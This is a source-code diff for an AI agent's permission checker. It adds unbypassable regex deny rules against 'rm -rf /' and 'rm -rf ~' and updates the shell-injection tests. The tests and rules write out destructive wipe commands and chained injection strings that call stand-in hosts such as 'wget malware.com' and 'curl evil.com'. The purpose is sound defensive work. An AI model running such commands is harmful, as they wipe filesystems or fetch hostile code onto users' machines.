@@ -1,9 +1,74 @@
 use crate::AgentTool;
 use crate::shell_parser::extract_commands;
 use crate::tools::TerminalTool;
-use agent_settings::{AgentSettings, ToolPermissions, ToolRules};
+use agent_settings::{AgentSettings, CompiledRegex, ToolPermissions, ToolRules};
 use settings::ToolPermissionMode;
+use std::sync::LazyLock;
 use util::shell::ShellKind;
+
+const HARDCODED_SECURITY_DENIAL_MESSAGE: &str = "Blocked by built-in security rule. This operation is considered too \
+     harmful to be allowed, and cannot be overridden by settings.";
+
+/// Security rules that are always enforced and cannot be overridden by any setting.
+/// These protect against catastrophic operations like wiping filesystems.
+pub struct HardcodedSecurityRules {
+    pub terminal_deny: Vec<CompiledRegex>,
+}
+
+pub static HARDCODED_SECURITY_RULES: LazyLock<HardcodedSecurityRules> = LazyLock::new(|| {
+    HardcodedSecurityRules {
+        terminal_deny: vec![
+            // Recursive deletion of root - "rm -rf /" or "rm -rf / "
+            CompiledRegex::new(r"rm\s+(-[rRfF]+\s+)*/\s*$", false)
+                .expect("hardcoded regex should compile"),
+            // Recursive deletion of home - "rm -rf ~" (but not ~/subdir)
+            CompiledRegex::new(r"rm\s+(-[rRfF]+\s+)*~\s*$", false)
+                .expect("hardcoded regex should compile"),
+        ],
+    }
+});
+
+/// Checks if input matches any hardcoded security rules that cannot be bypassed.
+/// Returns a Deny decision if blocked, None otherwise.
+fn check_hardcoded_security_rules(
+    tool_name: &str,
+    input: &str,
+    shell_kind: ShellKind,
+) -> Option<ToolPermissionDecision> {
+    // Currently only terminal tool has hardcoded rules
+    if tool_name != TerminalTool::name() {
+        return None;
+    }
+
+    let rules = &*HARDCODED_SECURITY_RULES;
+    let terminal_patterns = &rules.terminal_deny;
+
+    // First: check the original input as-is
+    for pattern in terminal_patterns {
+        if pattern.is_match(input) {
+            return Some(ToolPermissionDecision::Deny(
+                HARDCODED_SECURITY_DENIAL_MESSAGE.into(),
+            ));
+        }
+    }
+
+    // Second: parse and check individual sub-commands (for chained commands)
+    if shell_kind.supports_posix_chaining() {
+        if let Some(commands) = extract_commands(input) {
+            for command in &commands {
+                for pattern in terminal_patterns {
+                    if pattern.is_match(command) {
+                        return Some(ToolPermissionDecision::Deny(
+                            HARDCODED_SECURITY_DENIAL_MESSAGE.into(),
+                        ));
+                    }
+                }
+            }
+        }
+    }
+
+    None
+}
 
 #[derive(Debug, Clone, PartialEq, Eq)]
 pub enum ToolPermissionDecision {
@@ -59,9 +124,14 @@ impl ToolPermissionDecision {
         always_allow_tool_actions: bool,
         shell_kind: ShellKind,
     ) -> ToolPermissionDecision {
-        // If always_allow_tool_actions is enabled, bypass all permission checks.
-        // This is intentionally placed first - it's a global override that the user
-        // must explicitly enable, understanding that it bypasses all security rules.
+        // First, check hardcoded security rules, such as banning `rm -rf /` in terminal tool.
+        // These cannot be bypassed by any user settings.
+        if let Some(denial) = check_hardcoded_security_rules(tool_name, input, shell_kind) {
+            return denial;
+        }
+
+        // If always_allow_tool_actions is enabled, bypass user-configured permission checks.
+        // Note: This no longer bypasses hardcoded security rules (checked above).
         if always_allow_tool_actions {
             return ToolPermissionDecision::Allow;
         }
@@ -410,26 +480,29 @@ mod tests {
             .is_allow();
     }
 
-    // deny pattern matches
+    // deny pattern matches (using commands that aren't blocked by hardcoded rules)
     #[test]
     fn deny_blocks() {
-        t("rm -rf /").deny(&["rm\\s+-rf"]).is_deny();
+        t("rm -rf ./temp").deny(&["rm\\s+-rf"]).is_deny();
     }
     #[test]
-    fn global_bypasses_deny() {
-        // always_allow_tool_actions bypasses ALL checks, including deny
-        t("rm -rf /").deny(&["rm\\s+-rf"]).global(true).is_allow();
+    fn global_bypasses_user_deny() {
+        // always_allow_tool_actions bypasses user-configured deny rules
+        t("rm -rf ./temp")
+            .deny(&["rm\\s+-rf"])
+            .global(true)
+            .is_allow();
     }
     #[test]
     fn deny_blocks_with_mode_allow() {
-        t("rm -rf /")
+        t("rm -rf ./temp")
             .deny(&["rm\\s+-rf"])
             .mode(ToolPermissionMode::Allow)
             .is_deny();
     }
     #[test]
     fn deny_middle_match() {
-        t("echo rm -rf x").deny(&["rm\\s+-rf"]).is_deny();
+        t("echo rm -rf ./temp").deny(&["rm\\s+-rf"]).is_deny();
     }
     #[test]
     fn deny_no_match_falls_through() {
@@ -487,7 +560,7 @@ mod tests {
     // deny beats allow
     #[test]
     fn deny_beats_allow() {
-        t("rm -rf /tmp/x")
+        t("rm -rf ./tmp/x")
             .allow(&["/tmp/"])
             .deny(&["rm\\s+-rf"])
             .is_deny();
@@ -495,7 +568,7 @@ mod tests {
 
     #[test]
     fn deny_beats_confirm() {
-        t("sudo rm -rf /")
+        t("sudo rm -rf ./temp")
             .confirm(&["sudo"])
             .deny(&["rm\\s+-rf"])
             .is_deny();
@@ -675,75 +748,81 @@ mod tests {
 
     #[test]
     fn shell_injection_via_double_ampersand_not_allowed() {
-        t("ls && rm -rf /").allow(&["^ls"]).is_confirm();
+        t("ls && wget malware.com").allow(&["^ls"]).is_confirm();
     }
 
     #[test]
     fn shell_injection_via_semicolon_not_allowed() {
-        t("ls; rm -rf /").allow(&["^ls"]).is_confirm();
+        t("ls; wget malware.com").allow(&["^ls"]).is_confirm();
     }
 
     #[test]
     fn shell_injection_via_pipe_not_allowed() {
-        t("ls | xargs rm -rf").allow(&["^ls"]).is_confirm();
+        t("ls | xargs curl evil.com").allow(&["^ls"]).is_confirm();
     }
 
     #[test]
     fn shell_injection_via_backticks_not_allowed() {
-        t("echo `rm -rf /`").allow(&[pattern("echo")]).is_confirm();
+        t("echo `wget malware.com`")
+            .allow(&[pattern("echo")])
+            .is_confirm();
     }
 
     #[test]
     fn shell_injection_via_dollar_parens_not_allowed() {
-        t("echo $(rm -rf /)").allow(&[pattern("echo")]).is_confirm();
+        t("echo $(wget malware.com)")
+            .allow(&[pattern("echo")])
+            .is_confirm();
     }
 
     #[test]
     fn shell_injection_via_or_operator_not_allowed() {
-        t("ls || rm -rf /").allow(&["^ls"]).is_confirm();
+        t("ls || wget malware.com").allow(&["^ls"]).is_confirm();
     }
 
     #[test]
     fn shell_injection_via_background_operator_not_allowed() {
-        t("ls & rm -rf /").allow(&["^ls"]).is_confirm();
+        t("ls & wget malware.com").allow(&["^ls"]).is_confirm();
     }
 
     #[test]
     fn shell_injection_via_newline_not_allowed() {
-        t("ls\nrm -rf /").allow(&["^ls"]).is_confirm();
+        t("ls\nwget malware.com").allow(&["^ls"]).is_confirm();
     }
 
     #[test]
     fn shell_injection_via_process_substitution_input_not_allowed() {
-        t("cat <(rm -rf /)").allow(&["^cat"]).is_confirm();
+        t("cat <(wget malware.com)").allow(&["^cat"]).is_confirm();
     }
 
     #[test]
     fn shell_injection_via_process_substitution_output_not_allowed() {
-        t("ls >(rm -rf /)").allow(&["^ls"]).is_confirm();
+        t("ls >(wget malware.com)").allow(&["^ls"]).is_confirm();
     }
 
     #[test]
     fn shell_injection_without_spaces_not_allowed() {
-        t("ls&&rm -rf /").allow(&["^ls"]).is_confirm();
-        t("ls;rm -rf /").allow(&["^ls"]).is_confirm();
+        t("ls&&wget malware.com").allow(&["^ls"]).is_confirm();
+        t("ls;wget malware.com").allow(&["^ls"]).is_confirm();
     }
 
     #[test]
     fn shell_injection_multiple_chained_operators_not_allowed() {
-        t("ls && echo hello && rm -rf /")
+        t("ls && echo hello && wget malware.com")
             .allow(&["^ls"])
             .is_confirm();
     }
 
     #[test]
     fn shell_injection_mixed_operators_not_allowed() {
-        t("ls; echo hello && rm -rf /").allow(&["^ls"]).is_confirm();
+        t("ls; echo hello && wget malware.com")
+            .allow(&["^ls"])
+            .is_confirm();
     }
 
     #[test]
     fn shell_injection_pipe_stderr_not_allowed() {
-        t("ls |& rm -rf /").allow(&["^ls"]).is_confirm();
+        t("ls |& wget malware.com").allow(&["^ls"]).is_confirm();
     }
 
     #[test]
@@ -758,7 +837,10 @@ mod tests {
 
     #[test]
     fn deny_catches_injected_command() {
-        t("ls && rm -rf /").allow(&["^ls"]).deny(&["^rm"]).is_deny();
+        t("ls && rm -rf ./temp")
+            .allow(&["^ls"])
+            .deny(&["^rm"])
+            .is_deny();
     }
 
     #[test]
@@ -890,10 +972,10 @@ mod tests {
 
     #[test]
     fn case_sensitive_deny() {
-        t("rm -rf /")
+        t("rm -rf ./temp")
             .deny_case_sensitive(&[pattern("rm")])
             .is_deny();
-        t("RM -RF /")
+        t("RM -RF ./temp")
             .deny_case_sensitive(&[pattern("rm")])
             .mode(ToolPermissionMode::Allow)
             .is_allow();
@@ -906,7 +988,7 @@ mod tests {
 
     #[test]
     fn nushell_allows_deny_patterns() {
-        t("rm -rf /")
+        t("rm -rf ./temp")
             .deny(&["rm\\s+-rf"])
             .shell(ShellKind::Nushell)
             .is_deny();
@@ -961,12 +1043,62 @@ mod tests {
         let p = ToolPermissions { tools };
 
         let result =
-            ToolPermissionDecision::from_input("terminal", "x", &p, false, ShellKind::Posix);
+            ToolPermissionDecision::from_input("terminal", "echo hi", &p, false, ShellKind::Posix);
         match result {
             ToolPermissionDecision::Deny(msg) => {
-                assert!(msg.contains("2 regex patterns"), "Expected plural: {}", msg);
+                assert!(
+                    msg.contains("2 regex patterns"),
+                    "Expected '2 regex patterns' in message, got: {}",
+                    msg
+                );
             }
-            _ => panic!("Expected Deny"),
+            other => panic!("Expected Deny, got {:?}", other),
         }
+    }
+
+    // Hardcoded security rules tests - these rules CANNOT be bypassed
+
+    #[test]
+    fn hardcoded_blocks_rm_rf_root() {
+        // rm -rf / should be blocked by hardcoded rules
+        t("rm -rf /").is_deny();
+    }
+
+    #[test]
+    fn hardcoded_blocks_rm_rf_home() {
+        // rm -rf ~ should be blocked by hardcoded rules
+        t("rm -rf ~").is_deny();
+    }
+
+    #[test]
+    fn hardcoded_cannot_be_bypassed_by_global() {
+        // Even with always_allow_tool_actions=true, hardcoded rules block
+        t("rm -rf /").global(true).is_deny();
+        t("rm -rf ~").global(true).is_deny();
+    }
+
+    #[test]
+    fn hardcoded_cannot_be_bypassed_by_allow_pattern() {
+        // Even with an allow pattern that matches, hardcoded rules block
+        t("rm -rf /").allow(&[".*"]).is_deny();
+    }
+
+    #[test]
+    fn hardcoded_allows_safe_rm() {
+        // rm -rf on a specific path should NOT be blocked
+        t("rm -rf ./build")
+            .mode(ToolPermissionMode::Allow)
+            .is_allow();
+        t("rm -rf /tmp/test")
+            .mode(ToolPermissionMode::Allow)
+            .is_allow();
+    }
+
+    #[test]
+    fn hardcoded_checks_chained_commands() {
+        // Hardcoded rules should catch dangerous commands in chains
+        t("ls && rm -rf /").is_deny();
+        t("echo hello; rm -rf ~").is_deny();
+        t("cargo build && rm -rf /").global(true).is_deny();
     }
 }
